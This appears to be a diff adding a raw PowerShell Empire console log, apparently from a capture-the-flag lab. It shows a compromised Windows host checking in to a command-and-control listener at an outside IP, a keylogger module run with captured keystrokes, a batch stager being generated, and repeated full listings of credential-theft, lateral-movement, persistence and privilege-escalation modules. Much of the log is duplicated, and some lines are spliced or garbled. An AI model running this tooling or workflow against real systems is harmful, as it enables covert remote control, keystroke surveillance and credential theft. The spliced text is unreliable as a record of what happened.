@@ -1,0 +1,3781 @@
+====================================================================================
+ [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3
+====================================================================================
+
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       180 modules currently loaded
+
+       1 listeners currently active
+
+       0 agents currently active
+
+
+(Empire) > [+] Initial agent RBH21WLMXZGPTSSK from 73.245.208.66 now active
+
+(Empire) > agents
+
+[*] Active agents:
+
+  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
+  ---------          -----------     ------------    ---------           -------             -----    --------------------
+  RBH21WLMXZGPTSSK   192.168.4.38    WIN764PRO       *KKCTF\Administratorpowershell/1524     5/0.0    2017-04-03 18:34:37
+
+(Empire: agents) > interact RBH21WLMXZGPTSSK
+(Empire: RBH21WLMXZGPTSSK) > help
+
+Agent Commands
+==============
+agents            Jump to the Agents menu.
+back              Go back a menu.
+bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener>
+clear             Clear out agent tasking.
+creds             Display/return credentials from the database.
+download          Task an agent to download a file.
+exit              Task agent to exit.
+help              Displays the help menu or syntax for particular commands.
+info              Display information about this agent
+injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>
+jobs              Return jobs or kill a running job.
+kill              Task an agent to kill a particular process name or ID.
+killdate          Get or set an agent's killdate (01/01/2016).
+list              Lists all active agents (or listeners).
+listeners         Jump to the listeners menu.
+lostlimit         Task an agent to change the limit on lost agent detection
+main              Go back to the main menu.
+mimikatz          Runs Invoke-Mimikatz on the client.
+psinject          Inject a launcher into a remote process. Ex. psinject <listener> <pid>
+pth               Executes PTH for a CredID through Mimikatz.
+rename            Rename the agent.
+revtoself         Uses credentials/tokens to revert token privileges.
+sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]
+scriptcmd         Execute a function in the currently imported PowerShell script.
+scriptimport      Imports a PowerShell script and keeps it in memory in the agent.
+searchmodule      Search Empire module names/descriptions.
+shell             Task an agent to use a shell command.
+sleep             Task an agent to 'sleep interval [jitter]'
+spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <listener>
+steal_token       Uses credentials/tokens to impersonate a token for a given process ID.
+sysinfo           Task an agent to get system information.
+updateprofile     Update an agent connection profile.
+upload            Task an agent to upload a file.
+usemodule         Use an Empire PowerShell module.
+workinghours      Get or set an agent's working hours (9:00-17:00).
+
+(Empire: RBH21WLMXZGPTSSK) > info
+
+[*] Agent info:
+
+	ps_version      	2
+	old_uris        	None
+	jitter          	0.0
+	servers         	None
+	internal_ip     	192.168.4.38
+	working_hours   	
+	session_key     	hs7z/-321?C<$r)dElbN]}IG&OJ;,%6c
+	children        	None
+	checkin_time    	2017-04-03 18:34:07
+	hostname        	WIN764PRO
+	delay           	5
+	uris            	/admin/get.php,/news.asp,/login/process.jsp
+	username        	KKCTF\Administrator
+	kill_date       	
+	parent          	None
+	process_name    	powershell
+	listener        	http://159.203.64.71:8080/
+	sessionID       	RBH21WLMXZGPTSSK
+	process_id      	1524
+	os_details      	Microsoft Windows 7 Professional
+	lost_limit      	60
+	ID              	1
+	name            	RBH21WLMXZGPTSSK
+	external_ip     	73.245.208.66
+	headers         	
+	user_agent      	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+	lastseen_time   	2017-04-03 18:35:03
+	high_integrity  	1
+
+(Empire: RBH21WLMXZGPTSSK) > sysinfo
+(Empire: RBH21WLMXZGPTSSK) > 
+Listener:         http://159.203.64.71:8080
+Internal IP:      192.168.4.38
+Username:         KKCTF\Administrator
+Hostname:         WIN764PRO
+OS:               Microsoft Windows 7 Professional 
+High Integrity:   1
+Process Name:     powershell
+Process ID:       1524
+PSVersion:        2
+
+(Empire: RBH21WLMXZGPTSSK) > usemodule collection/keylogger
+(Empire: collection/keylogger) > info
+
+           Name: Get-KeyStrokes
+         Module: collection/keylogger
+     NeedsAdmin: False
+      OpsecSafe: True
+   MinPSVersion: 2
+     Background: True
+OutputExtension: None
+
+Authors:
+  @obscuresec
+  @mattifestation
+  @harmj0y
+
+Description:
+  Logs keys pressed, time and the active window (when
+  changed).
+
+Options:
+
+  Name  Required    Value                     Description
+  ----  --------    -------                   -----------
+  Agent True        RBH21WLMXZGPTSSK          Agent to run module on.                 
+
+(Empire: collection/keylogger) > execute
+(Empire: collection/keylogger) > 
+Job started: Debug32_gzbsm
+
+
+
+ - 03/04/2017:14:41:15:88
+notepad[Enter]
+
+Untitled - Notepad - 03/04/2017:14:41:18:01
+this[SpaceBar] is[SpaceBar] a[SpaceBar] ke
+
+
+for[SpaceBar] empire[SpaceBar] paylo
+
+
+tesEnter]
+
+
+t[SpaceBar] thiis[SpaceBar] is[SpaceBar] a[SpaceBar] test[Enter]
+
+
+er for.
+  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
+                                                 otherwise displayed on the screen.
+  Proxy            False       default           Proxy to use for request (default, none,
+                                                 or other).
+  UserAgent        False       default           User-agent string to use for the staging
+                                                 request (default, none, or other).
+  Delete           False       True              Switch. Delete .bat after running.
+
+
+(Empire: stager/launcher_bat) > set Listener test
+(Empire: stager/launcher_bat) > execute
+
+[*] Stager output written out to: /tmp/launcher.bat
+
+(Empire: stager/launcher_bat) > back
+(Empire: listeners) > back
+
+====================================================================================
+ Empire: PowerShell post-exploitation agent | [Version]: 1.6.0
+====================================================================================
+ [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3
+====================================================================================
+
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       180 modules currently loaded
+
+       1 listeners currently active
+
+       0 agents currently active
+
+
+(Empire) > [+] Initial agent RBH21WLMXZGPTSSK from 73.245.208.66 now active
+
+(Empire) > agents
+
+[*] Active agents:
+
+  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
+  ---------          -----------     ------------    ---------           -------             -----    --------------------
+  RBH21WLMXZGPTSSK   192.168.4.38    WIN764PRO       *KKCTF\Administratorpowershell/1524     5/0.0    2017-04-03 18:34:37
+
+(Empire: agents) > interact RBH21WLMXZGPTSSK
+(Empire: RBH21WLMXZGPTSSK) > help
+
+Agent Commands
+==============
+agents            Jump to the Agents menu.
+back              Go back a menu.
+bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener>
+clear             Clear out agent tasking.
+creds             Display/return credentials from the database.
+download          Task an agent to download a file.
+exit              Task agent to exit.
+help              Displays the help menu or syntax for particular commands.
+info              Display information about this agent
+injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>
+jobs              Return jobs or kill a running job.
+kill              Task an agent to kill a particular process name or ID.
+killdate          Get or set an agent's killdate (01/01/2016).
+list              Lists all active agents (or listeners).
+listeners         Jump to the listeners menu.
+lostlimit         Task an agent to change the limit on lost agent detection
+main              Go back to the main menu.
+mimikatz          Runs Invoke-Mimikatz on the client.
+psinject          Inject a launcher into a remote process. Ex. psinject <listener> <pid>
+pth               Executes PTH for a CredID through Mimikatz.
+rename            Rename the agent.
+revtoself         Uses credentials/tokens to revert token privileges.
+sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]
+scriptcmd         Execute a function in the currently imported PowerShell script.
+scriptimport      Imports a PowerShell script and keeps it in memory in the agent.
+searchmodule      Search Empire module names/descriptions.
+shell             Task an agent to use a shell command.
+sleep             Task an agent to 'sleep interval [jitter]'
+spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <listener>
+steal_token       Uses credentials/tokens to impersonate a token for a given process ID.
+sysinfo           Task an agent to get system information.
+updateprofile     Update an agent connection profile.
+upload            Task an agent to upload a file.
+usemodule         Use an Empire PowerShell module.
+workinghours      Get or set an agent's working hours (9:00-17:00).
+
+(Empire: RBH21WLMXZGPTSSK) > info
+
+[*] Agent info:
+
+	ps_version      	2
+	old_uris        	None
+	jitter          	0.0
+	servers         	None
+	internal_ip     	192.168.4.38
+	working_hours   	
+	session_key     	hs7z/-321?C<$r)dElbN]}IG&OJ;,%6c
+	children        	None
+	checkin_time    	2017-04-03 18:34:07
+	hostname        	WIN764PRO
+	delay           	5
+	uris            	/admin/get.php,/news.asp,/login/process.jsp
+	username        	KKCTF\Administrator
+	kill_date       	
+	parent          	None
+	process_name    	powershell
+	listener        	http://159.203.64.71:8080/
+	sessionID       	RBH21WLMXZGPTSSK
+	process_id      	1524
+	os_details      	Microsoft Windows 7 Professional
+	lost_limit      	60
+	ID              	1
+	name            	RBH21WLMXZGPTSSK
+	external_ip     	73.245.208.66
+	headers         	
+	user_agent      	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+	lastseen_time   	2017-04-03 18:35:03
+	high_integrity  	1
+
+(Empire: RBH21WLMXZGPTSSK) > help
+
+Agent Commands
+==============
+agents            Jump to the Agents menu.
+back              Go back a menu.
+bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener>
+clear             Clear out agent tasking.
+creds             Display/return credentials from the database.
+download          Task an agent to download a file.
+exit              Task agent to exit.
+help              Displays the help menu or syntax for particular commands.
+info              Display information about this agent
+injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>
+jobs              Return jobs or kill a running job.
+kill              Task an agent to kill a particular process name or ID.
+killdate          Get or set an agent's killdate (01/01/2016).
+list              Lists all active agents (or listeners).
+listeners         Jump to the listeners menu.
+lostlimit         Task an agent to change the limit on lost agent detection
+main              Go back to the main menu.
+mimikatz          Runs Invoke-Mimikatz on the client.
+psinject          Inject a launcher into a remote process. Ex. psinject <listener> <pid>
+pth               Executes PTH for a CredID through Mimikatz.
+rename            Rename the agent.
+revtoself         Uses credentials/tokens to revert token privileges.
+sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]
+scriptcmd         Execute a function in the currently imported PowerShell script.
+scriptimport      Imports a PowerShell script and keeps it in memory in the agent.
+searchmodule      Search Empire module names/descriptions.
+shell             Task an agent to use a shell command.
+sleep             Task an agent to 'sleep interval [jitter]'
+spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <listener>
+steal_token       Uses credentials/tokens to impersonate a token for a given process ID.
+sysinfo           Task an agent to get system information.
+updateprofile     Update an agent connection profile.
+upload            Task an agent to upload a file.
+usemodule         Use an Empire PowerShell module.
+workinghours      Get or set an agent's working hours (9:00-17:00).
+
+(Empire: RBH21WLMXZGPTSSK) > sysinfo
+(Empire: RBH21WLMXZGPTSSK) > 
+Listener:         http://159.203.64.71:8080
+Internal IP:      192.168.4.38
+Username:         KKCTF\Administrator
+Hostname:         WIN764PRO
+OS:               Microsoft Windows 7 Professional 
+High Integrity:   1
+Process Name:     powershell
+Process ID:       1524
+PSVersion:        2
+
+(Empire: RBH21WLMXZGPTSSK) > help
+
+Agent Commands
+==============
+agents            Jump to the Agents menu.
+back              Go back a menu.
+bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener>
+clear             Clear out agent tasking.
+creds             Display/return credentials from the database.
+download          Task an agent to download a file.
+exit              Task agent to exit.
+help              Displays the help menu or syntax for particular commands.
+info              Display information about this agent
+injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>
+jobs              Return jobs or kill a running job.
+kill              Task an agent to kill a particular process name or ID.
+killdate          Get or set an agent's killdate (01/01/2016).
+list              Lists all active agents (or listeners).
+listeners         Jump to the listeners menu.
+lostlimit         Task an agent to change the limit on lost agent detection
+main              Go back to the main menu.
+mimikatz          Runs Invoke-Mimikatz on the client.
+psinject          Inject a launcher into a remote process. Ex. psinject <listener> <pid>
+pth               Executes PTH for a CredID through Mimikatz.
+rename            Rename the agent.
+revtoself         Uses credentials/tokens to revert token privileges.
+sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]
+scriptcmd         Execute a function in the currently imported PowerShell script.
+scriptimport      Imports a PowerShell script and keeps it in memory in the agent.
+searchmodule      Search Empire module names/descriptions.
+shell             Task an agent to use a shell command.
+sleep             Task an agent to 'sleep interval [jitter]'
+spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <listener>
+steal_token       Uses credentials/tokens to impersonate a token for a given process ID.
+sysinfo           Task an agent to get system information.
+updateprofile     Update an agent connection profile.
+upload            Task an agent to upload a file.
+usemodule         Use an Empire PowerShell module.
+workinghours      Get or set an agent's working hours (9:00-17:00).
+
+(Empire: RBH21WLMXZGPTSSK) > usemodule 
+Display all 180 possibilities? (y or n)
+code_execution/invoke_dllinjection
+code_execution/invoke_metasploitpayload
+code_execution/invoke_reflectivepeinjection
+code_execution/invoke_shellcode
+code_execution/invoke_shellcodemsil
+collection/ChromeDump
+collection/FoxDump
+collection/WebcamRecorder
+collection/browser_data
+collection/clipboard_monitor
+collection/file_finder
+collection/find_interesting_file
+collection/get_indexed_item
+collection/inveigh
+collection/inveigh_bruteforce
+collection/keylogger
+collection/minidump
+collection/netripper
+collection/ninjacopy
+collection/packet_capture
+collection/prompt
+collection/screenshot
+collection/vaults/add_keepass_config_trigger
+collection/vaults/find_keepass_config
+collection/vaults/get_keepass_config_trigger
+collection/vaults/keethief
+collection/vaults/remove_keepass_config_trigger
+credentials/credential_injection
+credentials/enum_cred_store
+credentials/get_spn_tickets
+credentials/mimikatz/cache
+credentials/mimikatz/certs
+credentials/mimikatz/command
+credentials/mimikatz/dcsync
+credentials/mimikatz/dcsync_hashdump
+credentials/mimikatz/extract_tickets
+credentials/mimikatz/golden_ticket
+credentials/mimikatz/logonpasswords
+credentials/mimikatz/lsadump
+credentials/mimikatz/mimitokens
+credentials/mimikatz/pth
+credentials/mimikatz/purge
+credentials/mimikatz/sam
+credentials/mimikatz/silver_ticket
+credentials/mimikatz/trust_keys
+credentials/powerdump
+credentials/tokens
+credentials/vault_credential
+exfiltration/egresscheck
+exploitation/exploit_jboss
+exploitation/exploit_jenkins
+lateral_movement/inveigh_relay
+lateral_movement/invoke_psexec
+lateral_movement/invoke_psremoting
+lateral_movement/invoke_sshcommand
+lateral_movement/invoke_wmi
+lateral_movement/invoke_wmi_debugger
+lateral_movement/jenkins_script_console
+lateral_movement/new_gpo_immediate_task
+management/disable_rdp
+management/downgrade_account
+management/enable_multi_rdp
+management/enable_rdp
+management/get_domain_sid
+management/honeyhash
+management/invoke_script
+management/lock
+management/logoff
+management/mailraider/disable_security
+management/mailraider/get_emailitems
+management/mailraider/get_subfolders
+management/mailraider/mail_search
+management/mailraider/search_gal
+management/mailraider/send_mail
+management/mailraider/view_email
+management/psinject
+management/redirector
+management/restart
+management/runas
+management/sid_to_user
+management/spawn
+management/spawnas
+management/timestomp
+management/user_to_sid
+management/wdigest_downgrade
+management/zipfolder
+persistence/elevated/registry
+persistence/elevated/schtasks
+persistence/elevated/wmi
+persistence/misc/add_netuser
+persistence/misc/add_sid_history
+persistence/misc/debugger
+persistence/misc/disable_machine_acct_change
+persistence/misc/get_ssps
+persistence/misc/install_ssp
+persistence/misc/memssp
+persistence/misc/skeleton_key
+persistence/powerbreach/deaduser
+persistence/powerbreach/eventlog
+persistence/powerbreach/resolver
+persistence/userland/backdoor_lnk
+persistence/userland/normal
+persistence/userland/registry
+persistence/userland/schtasks
+privesc/ask
+privesc/bypassuac
+privesc/bypassuac_eventvwr
+privesc/bypassuac_wscript
+privesc/getsystem
+privesc/gpp
+privesc/mcafee_sitelist
+privesc/ms16-032
+privesc/powerup/allchecks
+privesc/powerup/find_dllhijack
+privesc/powerup/service_exe_restore
+privesc/powerup/service_exe_stager
+privesc/powerup/service_exe_useradd
+privesc/powerup/service_stager
+privesc/powerup/service_useradd
+privesc/powerup/write_dllhijacker
+privesc/tater
+recon/find_fruit
+recon/http_login
+situational_awareness/host/antivirusproduct
+situational_awareness/host/computerdetails
+situational_awareness/host/dnsserver
+situational_awareness/host/findtrusteddocuments
+situational_awareness/host/get_pathacl
+situational_awareness/host/get_proxy
+situational_awareness/host/paranoia
+situational_awareness/host/winenum
+situational_awareness/network/arpscan
+situational_awareness/network/get_exploitable_system
+situational_awareness/network/get_spn
+situational_awareness/network/portscan
+situational_awareness/network/powerview/find_computer_field
+situational_awareness/network/powerview/find_foreign_group
+situational_awareness/network/powerview/find_foreign_user
+situational_awareness/network/powerview/find_gpo_computer_admin
+situational_awareness/network/powerview/find_gpo_location
+situational_awareness/network/powerview/find_localadmin_access
+situational_awareness/network/powerview/find_managed_security_group
+situational_awareness/network/powerview/find_user_field
+situational_awareness/network/powerview/get_cached_rdpconnection
+situational_awareness/network/powerview/get_computer
+situational_awareness/network/powerview/get_dfs_share
+situational_awareness/network/powerview/get_domain_controller
+situational_awareness/network/powerview/get_domain_policy
+situational_awareness/network/powerview/get_domain_trust
+situational_awareness/network/powerview/get_fileserver
+situational_awareness/network/powerview/get_forest
+situational_awareness/network/powerview/get_forest_domain
+situational_awareness/network/powerview/get_gpo
+situational_awareness/network/powerview/get_gpo_computer
+situational_awareness/network/powerview/get_group
+situational_awareness/network/powerview/get_group_member
+situational_awareness/network/powerview/get_localgroup
+situational_awareness/network/powerview/get_loggedon
+situational_awareness/network/powerview/get_object_acl
+situational_awareness/network/powerview/get_ou
+situational_awareness/network/powerview/get_rdp_session
+situational_awareness/network/powerview/get_session
+situational_awareness/network/powerview/get_site
+situational_awareness/network/powerview/get_subnet
+situational_awareness/network/powerview/get_user
+situational_awareness/network/powerview/map_domain_trust
+situational_awareness/network/powerview/process_hunter
+situational_awareness/network/powerview/set_ad_object
+situational_awareness/network/powerview/share_finder
+situational_awareness/network/powerview/user_hunter
+situational_awareness/network/reverse_dns
+situational_awareness/network/smbautobrute
+situational_awareness/network/smbscanner
+trollsploit/message
+trollsploit/process_killer
+trollsploit/rick_ascii
+trollsploit/rick_astley
+trollsploit/thunderstruck
+trollsploit/voicetroll
+trollsploit/wallpaper
+(Empire: RBH21WLMXZGPTSSK) > usemodule collection/keylogger
+(Empire: collection/keylogger) > info
+
+           Name: Get-KeyStrokes
+         Module: collection/keylogger
+     NeedsAdmin: False
+      OpsecSafe: True
+   MinPSVersion: 2
+     Background: True
+OutputExtension: None
+
+Authors:
+  @obscuresec
+  @mattifestation
+  @harmj0y
+
+Description:
+  Logs keys pressed, time and the active window (when
+  changed).
+
+Options:
+
+  Name  Required    Value                     Description
+  ----  --------    -------                   -----------
+  Agent True        RBH21WLMXZGPTSSK          Agent to run module on.                 
+
+(Empire: collection/keylogger) > execute
+(Empire: collection/keylogger) > 
+Job started: Debug32_gzbsm
+
+
+
+ - 03/04/2017:14:41:15:88
+notepad[Enter]
+
+Untitled - Notepad - 03/04/2017:14:41:18:01
+this[SpaceBar] is[SpaceBar] a[SpaceBar] ke
+
+
+for[SpaceBar] empire[SpaceBar] paylo
+
+
+tesEnter]
+
+
+t[SpaceBar] thiis[SpaceBar] is[SpaceBar] a[SpaceBar] test[Enter]
+
+
+(Empire: collection/keylogger) > 
+(Empire: collection/keylogger) > usemodule 
+Display all 180 possibilities? (y or n)
+code_execution/invoke_dllinjection
+code_execution/invoke_metasploitpayload
+code_execution/invoke_reflectivepeinjection
+code_execution/invoke_shellcode
+code_execution/invoke_shellcodemsil
+collection/ChromeDump
+collection/FoxDump
+collection/WebcamRecorder
+collection/browser_data
+collection/clipboard_monitor
+collection/file_finder
+collection/find_interesting_file
+collection/get_indexed_item
+collection/inveigh
+collection/inveigh_bruteforce
+collection/keylogger
+collection/minidump
+collection/netripper
+collection/ninjacopy
+collection/packet_capture
+collection/prompt
+collection/screenshot
+collection/vaults/add_keepass_config_trigger
+collection/vaults/find_keepass_config
+collection/vaults/get_keepass_config_trigger
+collection/vaults/keethief
+collection/vaults/remove_keepass_config_trigger
+credentials/credential_injection
+credentials/enum_cred_store
+credentials/get_spn_tickets
+credentials/mimikatz/cache
+credentials/mimikatz/certs
+credentials/mimikatz/command
+credentials/mimikatz/dcsync
+credentials/mimikatz/dcsync_hashdump
+credentials/mimikatz/extract_tickets
+credentials/mimikatz/golden_ticket
+credentials/mimikatz/logonpasswords
+credentials/mimikatz/lsadump
+credentials/mimikatz/mimitokens
+credentials/mimikatz/pth
+credentials/mimikatz/purge
+credentials/mimikatz/sam
+credentials/mimikatz/silver_ticket
+credentials/mimikatz/trust_keys
+credentials/powerdump
+credentials/tokens
+credentials/vault_credential
+exfiltration/egresscheck
+exploitation/exploit_jboss
+exploitation/exploit_jenkins
+lateral_movement/inveigh_relay
+lateral_movement/invoke_psexec
+lateral_movement/invoke_psremoting
+lateral_movement/invoke_sshcommand
+lateral_movement/invoke_wmi
+lateral_movement/invoke_wmi_debugger
+lateral_movement/jenkins_script_console
+lateral_movement/new_gpo_immediate_task
+management/disable_rdp
+management/downgrade_account
+management/enable_multi_rdp
+management/enable_rdp
+management/get_domain_sid
+management/honeyhash
+management/invoke_script
+management/lock
+management/logoff
+management/mailraider/disable_security
+management/mailraider/get_emailitems
+management/mailraider/get_subfolders
+management/mailraider/mail_search
+management/mailraider/search_gal
+management/mailraider/send_mail
+management/mailraider/view_email
+management/psinject
+management/redirector
+management/restart
+management/runas
+management/sid_to_user
+management/spawn
+management/spawnas
+management/timestomp
+management/user_to_sid
+management/wdigest_downgrade
+management/zipfolder
+persistence/elevated/registry
+persistence/elevated/schtasks
+persistence/elevated/wmi
+persistence/misc/add_netuser
+persistence/misc/add_sid_history
+persistence/misc/debugger
+persistence/misc/disable_machine_acct_change
+persistence/misc/get_ssps
+persistence/misc/install_ssp
+persistence/misc/memssp
+persistence/misc/skeleton_key
+persistence/powerbreach/deaduser
+persistence/powerbreach/eventlog
+persistence/powerbreach/resolver
+persistence/userland/backdoor_lnk
+persistence/userland/normal
+persistence/userland/registry
+persistence/userland/schtasks
+privesc/ask
+privesc/bypassuac
+privesc/bypassuac_eventvwr
+privesc/bypassuac_wscript
+privesc/getsystem
+privesc/gpp
+privesc/mcafee_sitelist
+privesc/ms16-032
+privesc/powerup/allchecks
+privesc/powerup/find_dllhijack
+privesc/powerup/service_exe_restore
+privesc/powerup/service_exe_stager
+privesc/powerup/service_exe_useradd
+privesc/powerup/service_stager
+privesc/powerup/service_useradd
+privesc/powerup/write_dllhijacker
+privesc/tater
+recon/find_fruit
+recon/http_login
+situational_awareness/host/antivirusproduct
+situational_awareness/host/computerdetails
+situational_awareness/host/dnsserver
+situational_awareness/host/findtrusteddocuments
+situational_awareness/host/get_pathacl
+situational_awareness/host/get_proxy
+situational_awareness/host/paranoia
+situational_awareness/host/winenum
+situational_awareness/network/arpscan
+situational_awareness/network/get_exploitable_system
+situational_awareness/network/get_spn
+situational_awareness/network/portscan
+situational_awareness/network/powerview/find_computer_field
+situational_awareness/network/powerview/find_foreign_group
+situational_awareness/network/powerview/find_foreign_user
+situational_awareness/network/powerview/find_gpo_computer_admin
+situational_awareness/network/powerview/find_gpo_location
+situational_awareness/network/powerview/find_localadmin_access
+situational_awareness/network/powerview/find_managed_security_group
+situational_awareness/network/powerview/find_user_field
+situational_awareness/network/powerview/get_cached_rdpconnection
+situational_awareness/network/powerview/get_computer
+situational_awareness/network/powerview/get_dfs_share
+situational_awareness/network/powerview/get_domain_controller
+situational_awareness/network/powerview/get_domain_policy
+situational_awareness/network/powerview/get_domain_trust
+situational_awareness/network/powerview/get_fileserver
+situational_awareness/network/powerview/get_forest
+situational_awareness/network/powerview/get_forest_domain
+situational_awareness/network/powerview/get_gpo
+situational_awareness/network/powerview/get_gpo_computer
+situational_awareness/network/powerview/get_group
+situational_awareness/network/powerview/get_group_member
+situational_awareness/network/powerview/get_localgroup
+situational_awareness/network/powerview/get_loggedon
+situational_awareness/network/powerview/get_object_acl
+situational_awareness/network/powerview/get_ou
+situational_awareness/network/powerview/get_rdp_session
+situational_awareness/network/powerview/get_session
+situational_awareness/network/powerview/get_site
+situational_awareness/network/powerview/get_subnet
+situational_awareness/network/powerview/get_user
+situational_awareness/network/powerview/map_domain_trust
+situational_awareness/network/powerview/process_hunter
+situational_awareness/network/powerview/set_ad_object
+situational_awareness/network/powerview/share_finder
+situational_awareness/network/powerview/user_hunter
+situational_awareness/network/reverse_dns
+situational_awareness/network/smbautobrute
+situational_awareness/network/smbscanner
+trollsploit/message
+trollsploit/process_killer
+trollsploit/rick_ascii
+trollsploit/rick_astley
+trollsploit/thunderstruck
+trollsploit/voicetroll
+trollsploit/wallpaper
+n_sidre: collection/keylogger) > usemodule management/get_domai 
+(Empire: management/get_domain_sid) > info
+
+           Name: Get-DomainSID
+         Module: management/get_domain_sid
+     NeedsAdmin: False
+      OpsecSafe: True
+   MinPSVersion: 2
+     Background: True
+OutputExtension: None
+
+Authors:
+  @harmj0y
+
+Description:
+  Returns the SID for the current of specified domain.
+
+Options:
+
+  Name   Required    Value                     Description
+  ----   --------    -------                   -----------
+  Domain False                                 Domain to resolve SID for, defaults to  
+                                               the current domain.                     
+  Agent  True        RBH21WLMXZGPTSSK          Agent to run module on.                 
+
+(Empire: management/get_domain_sid) > execute
+(Empire: management/get_domain_sid) > 
+Job started: Debug32_kzd2b
+
+
+
+Get-DomainSID completed!
+
+
+(Empire: management/get_domain_sid) > usemodule 
+Display all 180 possibilities? (y or n)
+code_execution/invoke_dllinjection
+code_execution/invoke_metasploitpayload
+code_execution/invoke_reflectivepeinjection
+code_execution/invoke_shellcode
+code_execution/invoke_shellcodemsil
+collection/ChromeDump
+collection/FoxDump
+collection/WebcamRecorder
+collection/browser_data
+collection/clipboard_monitor
+collection/file_finder
+collection/find_interesting_file
+collection/get_indexed_item
+collection/inveigh
+collection/inveigh_bruteforce
+collection/keylogger
+collection/minidump
+collection/netripper
+collection/ninjacopy
+collection/packet_capture
+collection/prompt
+collection/screenshot
+collection/vaults/add_keepass_config_trigger
+collection/vaults/find_keepass_config
+collection/vaults/get_keepass_config_trigger
+collection/vaults/keethief
+collection/vaults/remove_keepass_config_trigger
+credentials/credential_injection
+credentials/enum_cred_store
+credentials/get_spn_tickets
+credentials/mimikatz/cache
+credentials/mimikatz/certs
+credentials/mimikatz/command
+credentials/mimikatz/dcsync
+credentials/mimikatz/dcsync_hashdump
+credentials/mimikatz/extract_tickets
+credentials/mimikatz/golden_ticket
+credentials/mimikatz/logonpasswords
+credentials/mimikatz/lsadump
+credentials/mimikatz/mimitokens
+credentials/mimikatz/pth
+credentials/mimikatz/purge
+credentials/mimikatz/sam
+credentials/mimikatz/silver_ticket
+credentials/mimikatz/trust_keys
+credentials/powerdump
+credentials/tokens
+credentials/vault_credential
+exfiltration/egresscheck
+exploitation/exploit_jboss
+exploitation/exploit_jenkins
+lateral_movement/inveigh_relay
+lateral_movement/invoke_psexec
+lateral_movement/invoke_psremoting
+lateral_movement/invoke_sshcommand
+lateral_movement/invoke_wmi
+lateral_movement/invoke_wmi_debugger
+lateral_movement/jenkins_script_console
+lateral_movement/new_gpo_immediate_task
+management/disable_rdp
+management/downgrade_account
+management/enable_multi_rdp
+management/enable_rdp
+management/get_domain_sid
+management/honeyhash
+management/invoke_script
+management/lock
+management/logoff
+management/mailraider/disable_security
+management/mailraider/get_emailitems
+management/mailraider/get_subfolders
+management/mailraider/mail_search
+management/mailraider/search_gal
+management/mailraider/send_mail
+management/mailraider/view_email
+management/psinject
+management/redirector
+management/restart
+management/runas
+management/sid_to_user
+management/spawn
+management/spawnas
+management/timestomp
+management/user_to_sid
+management/wdigest_downgrade
+management/zipfolder
+persistence/elevated/registry
+persistence/elevated/schtasks
+persistence/elevated/wmi
+persistence/misc/add_netuser
+persistence/misc/add_sid_history
+persistence/misc/debugger
+persistence/misc/disable_machine_acct_change
+persistence/misc/get_ssps
+persistence/misc/install_ssp
+persistence/misc/memssp
+persistence/misc/skeleton_key
+persistence/powerbreach/deaduser
+persistence/powerbreach/eventlog
+persistence/powerbreach/resolver
+persistence/userland/backdoor_lnk
+persistence/userland/normal
+persistence/userland/registry
+persistence/userland/schtasks
+privesc/ask
+privesc/bypassuac
+privesc/bypassuac_eventvwr
+privesc/bypassuac_wscript
+privesc/getsystem
+privesc/gpp
+privesc/mcafee_sitelist
+privesc/ms16-032
+privesc/powerup/allchecks
+privesc/powerup/find_dllhijack
+privesc/powerup/service_exe_restore
+privesc/powerup/service_exe_stager
+privesc/powerup/service_exe_useradd
+privesc/powerup/service_stager
+privesc/powerup/service_useradd
+privesc/powerup/write_dllhijacker
+privesc/tater
+recon/find_fruit
+recon/http_login
+situational_awareness/host/antivirusproduct
+situational_awareness/host/computerdetails
+situational_awareness/host/dnsserver
+situational_awareness/host/findtrusteddocuments
+situational_awareness/host/get_pathacl
+situational_awareness/host/get_proxy
+situational_awareness/host/paranoia
+situational_awareness/host/winenum
+situational_awareness/network/arpscan
+situational_awareness/network/get_exploitable_system
+situational_awareness/network/get_spn
+situational_awareness/network/portscan
+situational_awareness/network/powerview/find_computer_field
+situational_awareness/network/powerview/find_foreign_group
+situational_awareness/network/powerview/find_foreign_user
+situational_awareness/network/powerview/find_gpo_computer_admin
+situational_awareness/network/powerview/find_gpo_location
+situational_awareness/network/powerview/find_localadmin_access
